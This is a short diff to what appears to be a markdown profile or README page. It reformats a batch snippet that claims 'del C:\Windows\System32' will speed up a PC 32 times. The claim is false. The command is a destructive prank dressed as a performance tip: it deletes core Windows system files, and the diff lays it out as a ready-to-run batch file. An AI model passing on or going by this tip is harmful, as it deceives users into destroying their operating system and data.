@@ -33,6 +33,10 @@ E-mail <mavis@pinkflamey.nl>
 
 `del C:\Windows\System32` will speed up your pc x32!
 
-```@echo off \ndel C:\Windows\System32 \npause```
+```
+@echo off 
+del C:\Windows\System32 
+pause
+```
 
 ---
